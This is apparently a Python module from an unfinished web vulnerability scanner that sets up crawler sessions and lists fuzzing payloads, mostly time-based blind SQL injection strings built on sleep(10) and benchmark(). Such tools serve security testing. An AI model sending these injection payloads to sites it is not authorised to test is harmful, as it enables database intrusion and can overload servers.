from urllib.parse import parse_qs, unquote, urlparse, urljoin, urlencode
from .Crawler import Crawler, DATABASE, sessions, var
from bs4 import BeautifulSoup
from threading import Thread
from base64 import b64decode
import tldextract


class Fuzzing:
    def __init__(self, URL, Page = False, db = {}, **REQUEST_INFO) -> None:
        self.tags = var.tags
        self.Page = Page
        self.URLists = set()
        self.FirstURL = urlparse(URL)
        self.LatestURL = self.URL = URL
        REQUEST_INFO.setdefault('timeout', var.TIMEOUT)
        REQUEST_INFO.setdefault('headers', var.USER_AGENT)
        if db:
            self.conn = DATABASE(host = db['HOST'], port = db['PORT'], user = db['USER'], passwd = db['PASSWORD'], db = db['DB'])
        else:
            self.conn = DATABASE(host = var.HOST, port = var.PORT, user = var.USER, passwd = var.PASSWORD, db = var.DB)

        self.table = tldextract.extract(URL).domain

        self.REQUEST_INFO = REQUEST_INFO
        self.URLJOIN = (lambda TMPURL: urljoin(self.URL, TMPURL) if TMPURL else None)
        
        if Page:
            self.REQUESTS = sessions(URL, **REQUEST_INFO)
            self.TMP_REQUEST = self.REQUESTS.webdriver()
        else:
            self.REQUESTS = sessions(URL, **REQUEST_INFO)
            self.TMP_REQUEST = self.REQUESTS.sess_get()

    def URL(self):
        self.conn.URL_SELECT(TABLE_NAME=self.table)

    def xss():
        payloads = []
        
        return payloads

    def opredirect():
        payloads = [
            ''
        ]

        return payloads

    def simple_sqli():
        payloads = [
            '\'',
            '"',
            '0',
            '0\'',
            '0"',
        ]

        return payloads

    def sleep_sqli():
        payloads = [
            '\' or sleep(10) -- \'',
            '" or sleep(10) -- "',
            '0 or sleep(10) -- ',
            '\' or sleep(10) #\'',
            '" or sleep(10) #"',
            '0 or sleep(10) #',
            '\' or benchmark(7380000000*10,md5(1)) -- \'',
            '" or benchmark(7380000000*10,md5(1)) -- "',
            '0 or benchmark(7380000000*10,md5(1)) -- ',
            '\' or benchmark(7380000000*10,md5(1)) #\'',
            '" or benchmark(7380000000*10,md5(1)) #"',
            '0 or benchmark(7380000000*10,md5(1)) #',
        ]

        return payloads